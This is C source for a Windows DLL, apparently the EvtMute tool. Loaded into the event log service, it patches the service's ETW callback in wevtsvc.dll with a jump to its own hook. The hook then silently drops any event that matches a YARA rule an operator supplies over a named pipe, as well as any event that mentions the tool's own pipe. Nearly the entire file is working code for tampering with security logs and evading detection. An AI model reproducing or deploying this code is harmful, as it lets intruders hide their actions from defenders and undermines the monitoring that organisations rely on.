#include <stdio.h>
#include <windows.h>
#include <tdh.h>
#include <psapi.h>
#include <evntcons.h>
#include <tlhelp32.h>

#include "pch.h"
#include "yara.h"
#include "evtsvchook.h"

// include everything inside our DLL.
#pragma comment (lib, "psapi.lib")
#pragma comment (lib, "tdh.lib")
#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "libyara64.lib")

// pattern for the start of the ETW callback.
#define PATTERN "\x48\x83\xec\x38\x4c\x8b\x0d"

CHAR*  cRule;
LPVOID lpCallbackOffset;
CHAR   OriginalBytes[50] = {};
BOOL   bActiveRuleChange = FALSE;

VOID HookEtwCallback()
{
	/*
	Hook the original ETW callback to redirect it to ours.
	*/

	DWORD oldProtect, oldOldProtect;

	unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 };

	*(void **)(boing + 2) = &EtwCallbackHook;

	VirtualProtect(lpCallbackOffset, 13, PAGE_EXECUTE_READWRITE, &oldProtect);
	memcpy(lpCallbackOffset, boing, sizeof(boing));
	VirtualProtect(lpCallbackOffset, 13, oldProtect, &oldOldProtect);

	return;
}

VOID DoOriginalEtwCallback( EVENT_RECORD *EventRecord )
{
	/*
	Restore the original ETW callback and then call it.
	This will report whatever event is stored in the param EventRecord.
	*/

	DWORD dwOldProtect;

	VirtualProtect(lpCallbackOffset, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, &dwOldProtect);
	memcpy(lpCallbackOffset, OriginalBytes, sizeof(OriginalBytes));
	VirtualProtect(lpCallbackOffset, sizeof(OriginalBytes), dwOldProtect, &dwOldProtect);

	EtwEventCallback_ EtwEventCallback = (EtwEventCallback_)lpCallbackOffset;

	EtwEventCallback(EventRecord);

	HookEtwCallback();
}

VOID RemoveTrailingSpace( PEVENT_MAP_INFO EventMapInfo )
{
	/*
	Remove the extra space at the end.
	Just to make the event cleaner when parsed.
	*/

	size_t ByteLength = 0;

	for (DWORD i = 0; i < EventMapInfo->EntryCount; i++)
	{
		ByteLength = (wcslen((PWCHAR)((PBYTE)EventMapInfo + EventMapInfo->MapEntryArray[i].OutputOffset)) - 1) * sizeof(wchar_t);
		*((PWCHAR)((PBYTE)EventMapInfo + (EventMapInfo->MapEntryArray[i].OutputOffset + ByteLength))) = L'\0';
	}
}

VOID GetMapInfo( PEVENT_RECORD EventRecord, 
	PWCHAR MapName, 
	ULONG DecodingSource, 
	PEVENT_MAP_INFO EventMapInfo
)
{
	/*
	Get infomation about the event needed to parse it.
	*/

	ULONG MapSize = 0;
	HANDLE HeapHandle = GetProcessHeap();

	ULONG result = TdhGetEventMapInformation(EventRecord, MapName, EventMapInfo, &MapSize);
	EventMapInfo = (PEVENT_MAP_INFO)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, MapSize);
	result = TdhGetEventMapInformation(EventRecord, MapName, EventMapInfo, &MapSize);

	if (result == ERROR_SUCCESS)
	{
		if (DecodingSource == DecodingSourceXMLFile)
		{
			RemoveTrailingSpace(EventMapInfo);
		}
	}
}

INT ToReportOrNotToReportThatIsTheQuestion( YR_SCAN_CONTEXT* Context,
	INT Message,
	PVOID pMessageData,
	PVOID pUserData
)
{
	/*
	Yara callback, check if the rule matches.
	If it does tell the hook to report it.
	*/

	if (Message == CALLBACK_MSG_RULE_MATCHING)
	{
		(*(int*)pUserData) = 1;
	}

	if (Message == CALLBACK_MSG_RULE_NOT_MATCHING)
	{
		(*(int*)pUserData) = 0;
	}

	return CALLBACK_CONTINUE;
}

VOID WINAPI EtwCallbackHook( PEVENT_RECORD EventRecord )
{
	/*
	Parse the event into a format that can be scanned with a yara rule.
	Then scan the event with said yara rule, and check if it matches or not.
	If it does not match and the name of the pipe is not in the event then report the event.
	If it does match then return and ignore the event.
	*/

	ULONG size = 0;
	DWORD dwReport = 0;
	DWORD dwCurrentHeapSize = 0;
	ULONG FormattedDataSize = 0;
	USHORT UserDataConsumed = 0;
	PWCHAR FormattedData = NULL;
	DWORD dwInitHeapSize = 10000;
	PEVENT_MAP_INFO EventMapInfo = NULL;
	HANDLE HeapHandle = GetProcessHeap();
	PBYTE UserData = (PBYTE)EventRecord->UserData;
	PBYTE EndOfUserData = (PBYTE)EventRecord->UserData + EventRecord->UserDataLength;

	ULONG result = TdhGetEventInformation(EventRecord, 0, NULL, NULL, &size);
	PTRACE_EVENT_INFO EventInfo = (PTRACE_EVENT_INFO)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, size);

	result = TdhGetEventInformation(EventRecord, 0, NULL, EventInfo, &size);
	if (result != ERROR_SUCCESS)
	{
		return;
	}

	CHAR* StringBuffer = (CHAR*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, dwInitHeapSize);
	if (StringBuffer == NULL)
	{
		return;
	}

	if (EventInfo->ProviderNameOffset > 0)
	{
		sprintf(StringBuffer, "Provider: %S\n", (PWCHAR)((PBYTE)(EventInfo)+EventInfo->ProviderNameOffset));
	}

	if (EventInfo->TaskNameOffset > 0)
	{
		sprintf(StringBuffer, "%sTask: %lS\n", StringBuffer, (PWCHAR)((PBYTE)(EventInfo)+EventInfo->TaskNameOffset));
	}

	if (EventInfo->TopLevelPropertyCount > 0)
	{
		for (ULONG i = 0; i < EventInfo->TopLevelPropertyCount; i++)
		{

			sprintf(StringBuffer, "%s%lS: ", StringBuffer, (PWCHAR)((PBYTE)(EventInfo)+EventInfo->EventPropertyInfoArray[i].NameOffset));

			GetMapInfo(
				EventRecord,
				(PWCHAR)((PBYTE)(EventInfo)+EventInfo->EventPropertyInfoArray[i].nonStructType.MapNameOffset),
				EventInfo->DecodingSource,
				EventMapInfo);

			result = TdhFormatProperty(
				EventInfo,
				EventMapInfo,
				sizeof(PVOID),
				EventInfo->EventPropertyInfoArray[i].nonStructType.InType,
				EventInfo->EventPropertyInfoArray[i].nonStructType.OutType,
				EventInfo->EventPropertyInfoArray[i].length,
				(USHORT)(EndOfUserData - UserData),
				UserData,
				&FormattedDataSize,
				FormattedData,
				&UserDataConsumed);

			FormattedData = (PWCHAR)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, FormattedDataSize);

			result = TdhFormatProperty(
				EventInfo,
				EventMapInfo,
				sizeof(PVOID),
				EventInfo->EventPropertyInfoArray[i].nonStructType.InType,
				EventInfo->EventPropertyInfoArray[i].nonStructType.OutType,
				EventInfo->EventPropertyInfoArray[i].length,
				(USHORT)(EndOfUserData - UserData),
				UserData,
				&FormattedDataSize,
				FormattedData,
				&UserDataConsumed);

			if (result == ERROR_SUCCESS)
			{
				sprintf(StringBuffer, "%s%S\n", StringBuffer, FormattedData);

				UserData += UserDataConsumed;
			}
		}
	}

	if (!bActiveRuleChange)
	{
		yr_rules_scan_mem(yrRules, (uint8_t*)StringBuffer, strlen(StringBuffer), 0, ToReportOrNotToReportThatIsTheQuestion, &dwReport, 0);
	}
	else
	{
		dwReport = 1;
	}
	
	if (dwReport == 0)
	{
		if (strstr(StringBuffer, PIPE_NAME) == NULL)
		{
			DoOriginalEtwCallback(EventRecord);
		}
	}

	HeapFree(HeapHandle, HEAP_ZERO_MEMORY, StringBuffer);

	return;
}

BOOL PlaceHook()
{
	/*
	Find the base address of wevtsvc.
	Then scan (base address + 0xfffff) for the pattern.
	When the offset is found call the hooking function.
	*/

	DWORD_PTR dwBase;
	DWORD i, dwSizeNeeded;
	CHAR cStringBuffer[200];
	HMODULE hModules[102400];
	TCHAR   szModule[MAX_PATH];
	DWORD oldProtect, oldOldProtect;

	if (EnumProcessModules(GetCurrentProcess(), hModules, sizeof(hModules), &dwSizeNeeded))
	{
		for (int i = 0; i < (dwSizeNeeded / sizeof(HMODULE)); i++)
		{
			ZeroMemory((PVOID)szModule, MAX_PATH);

			if (GetModuleBaseNameA(GetCurrentProcess(), hModules[i], (LPSTR)szModule, sizeof(szModule) / sizeof(TCHAR)))
			{
				if (!strcmp("wevtsvc.dll", (const char*)szModule))
				{
					dwBase = (DWORD_PTR)hModules[i];
				}
			}
		}
	}

	//sprintf_s(cStringBuffer, "[i] Base Address: 0x%llx\n", dwBase);
	//OutputDebugStringA(cStringBuffer);
	//memset(cStringBuffer, '\0', strlen(cStringBuffer));

	for (i = 0; i < 0xfffff; i++)
	{

		if (!memcmp((PVOID)(dwBase + i), (unsigned char*)PATTERN, strlen(PATTERN)))
		{
			lpCallbackOffset = (LPVOID)(dwBase + i);

			//sprintf(cStringBuffer, "[i] Offset: 0x%llx\n", lpCallbackOffset);
			//OutputDebugStringA(cStringBuffer);
			//memset(cStringBuffer, '\0', strlen(cStringBuffer));

			memcpy(OriginalBytes, lpCallbackOffset, 50);

			HookEtwCallback();

			return TRUE;
		}
	}

	return FALSE;
}

DWORD WINAPI RuleController(LPVOID lpParam)
{
	/*
	Start by setting a rule that will report everything (RULE_ALLOW_ALL)
	Listen on a named pipe for a new rule, when a rule is received it will destory the old rule
	and replace it with the new one. If the new rule is invalid to will drop all event (RULE_BLOCK_ALL)
	just to as a fail safe. Also controls a variable that keeps track of if the rule is being changed or not.
	While a rule is being changed all events will be dropped.
	*/

	CHAR*  cBuffer;
	DWORD  dwPipeRead;
	DWORD  dwHeapSize = 31337;
	HANDLE HeapHandle, hPipe;

	HeapHandle = GetProcessHeap();

	cRule = (CHAR*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, dwHeapSize);
	cBuffer = (CHAR*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, dwHeapSize);

	YRInitalize();

	RtlCopyMemory(cRule, RULE_ALLOW_ALL, strlen(RULE_ALLOW_ALL));

	if (YRCompilerCreate(&yrCompiler) != ERROR_SUCCESS)
	{
		return -1;
	}

	if (YRCompilerAddString(yrCompiler, cRule, NULL) != ERROR_SUCCESS)
	{
		return -1;
	}

	YRCompilerGetRules(yrCompiler, &yrRules);

	hPipe = CreateNamedPipeA(RULE_PIPE_NAME,
							 PIPE_ACCESS_DUPLEX,
							 PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
							 1,
							 31337,
							 31337,
							 NMPWAIT_USE_DEFAULT_WAIT,
							 NULL);

	while (hPipe != INVALID_HANDLE_VALUE)
	{
		if (ConnectNamedPipe(hPipe, NULL) != FALSE)
		{

			ZeroMemory(cRule, strlen(cRule));

			while (ReadFile(hPipe, cBuffer, sizeof(cBuffer) - 1, &dwPipeRead, NULL) != FALSE)
			{
				cBuffer[dwPipeRead] = '\0';
				sprintf(cRule, "%s%s", cRule, cBuffer);
			}

			bActiveRuleChange = TRUE;

			YRRulesDestroy(yrRules);
			YRCompilerDestroy(yrCompiler);
			YRFinalize();

			YRInitalize();

			if (YRCompilerCreate(&yrCompiler) == ERROR_SUCCESS)
			{
				if (YRCompilerAddString(yrCompiler, cRule, NULL) == ERROR_SUCCESS)
				{
					YRCompilerGetRules(yrCompiler, &yrRules);
				}
				else
				{
					YRCompilerDestroy(yrCompiler);
					YRFinalize();

					YRInitalize();

					ZeroMemory(cRule, strlen(cRule));
					RtlCopyMemory(cRule, RULE_BLOCK_ALL, strlen(RULE_BLOCK_ALL));

					if (YRCompilerCreate(&yrCompiler) != ERROR_SUCCESS)
					{
						return -1;
					}

					if (YRCompilerAddString(yrCompiler, cRule, NULL) != ERROR_SUCCESS)
					{
						return -1;
					}

					YRCompilerGetRules(yrCompiler, &yrRules);
				}
			}
		}
		bActiveRuleChange = FALSE;
		DisconnectNamedPipe(hPipe);
	}

	return 0;
}

VOID EvtMuteMain()
{
	/*
	Start the rule listener and place the hook.
	*/

	DWORD dwTid;
	HANDLE hThread;

	hThread = CreateThread(0, 0, RuleController, NULL, 0, &dwTid);

	if (!PlaceHook())
	{
		goto CLEANUP;
	}

	goto CLEANUP;

CLEANUP:
	CloseHandle(hThread);
	return;
}

BOOL APIENTRY DllMain( HMODULE hModule,
	DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		EvtMuteMain();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

